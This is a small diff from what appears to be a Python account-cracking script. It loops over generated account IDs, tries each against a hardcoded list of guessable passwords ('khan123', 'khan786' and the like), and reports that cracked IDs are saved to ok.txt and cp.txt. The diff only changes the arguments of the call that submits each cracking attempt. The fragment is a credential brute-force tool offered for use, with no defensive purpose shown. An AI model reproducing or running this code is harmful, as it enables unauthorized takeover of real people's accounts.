@@ -715,7 +715,7 @@ def random_number2():
 		for guru in ids:
 			ids = kode+guru
 			passlist = [guru,kode,'khankhan','khan12','khan1122','khan123456','khan123','khankhan123','khankhan12','khan786','khan007','khan khan','khan1234','khan12345']
-			yaari.submit(m1,ids,passlist)
+			yaari.submit(mmmm,ids,names,passlist)
 	linex()
 	print('[✓] Crack process has been completed')
 	print('[?] Idz saved in [ok.txt,cp.txt]')
